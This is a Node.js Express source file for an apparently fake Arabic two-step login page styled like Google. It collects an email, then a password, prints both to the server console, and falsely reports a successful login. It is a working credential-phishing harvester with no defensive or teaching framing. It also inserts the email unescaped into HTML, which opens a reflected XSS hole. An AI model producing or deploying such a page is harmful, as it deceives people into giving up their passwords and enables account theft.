const express = require("express");

const app = express();

app.use(express.urlencoded({ extended: true }));

let savedEmail = "";

app.get("/", (req, res) => {

res.send(`

<!DOCTYPE html>

<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>تسجيل الدخول</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial;
}

body{

height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#f1f5f9;

}

.box{

width:420px;
background:white;
padding:40px;
border-radius:20px;
box-shadow:0 0 25px rgba(0,0,0,0.15);

}

h2{

margin-bottom:15px;
color:#222;

}

p{

color:#666;
margin-bottom:25px;

}

input{

width:100%;
padding:15px;
border:1px solid #ccc;
border-radius:12px;
font-size:16px;
margin-top:10px;

}

button{

width:100%;
padding:15px;
margin-top:20px;
border:none;
border-radius:12px;
background:#4285f4;
color:white;
font-size:17px;
cursor:pointer;

}

button:hover{

background:#2d6cdf;

}

</style>

</head>

<body>

<div class="box">

<h2>
تسجيل الدخول
</h2>

<p>
أدخل البريد الإلكتروني
</p>

<form method="POST" action="/next">

<input 
type="text" 
name="email" 
placeholder="البريد الإلكتروني"
required
>

<button type="submit">
التالي
</button>

</form>

</div>

</body>

</html>

`);

});

app.post("/next", (req, res) => {

savedEmail = req.body.email;

res.send(`

<!DOCTYPE html>

<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>كلمة المرور</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial;
}

body{

height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#f1f5f9;

}

.box{

width:420px;
background:white;
padding:40px;
border-radius:20px;
box-shadow:0 0 25px rgba(0,0,0,0.15);

}

h2{

margin-bottom:15px;
color:#222;

}

.email{

color:#555;
margin-bottom:20px;

}

input{

width:100%;
padding:15px;
border:1px solid #ccc;
border-radius:12px;
font-size:16px;
margin-top:10px;

}

button{

width:100%;
padding:15px;
margin-top:20px;
border:none;
border-radius:12px;
background:#4285f4;
color:white;
font-size:17px;
cursor:pointer;

}

button:hover{

background:#2d6cdf;

}

</style>

</head>

<body>

<div class="box">

<h2>
أدخل كلمة المرور
</h2>

<div class="email">
${savedEmail}
</div>

<form method="POST" action="/login">

<input 
type="password" 
name="password" 
placeholder="كلمة المرور"
required
>

<button type="submit">
تسجيل الدخول
</button>

</form>

</div>

</body>

</html>

`);

});

app.post("/login", (req, res) => {

const password = req.body.password;

console.log("========== LOGIN ==========");
console.log("Email:", savedEmail);
console.log("Password:", password);
console.log("===========================");

res.send("تم تسجيل الدخول بنجاح");

});

app.listen(3000, () => {

console.log("Server running on http://localhost:3000");

});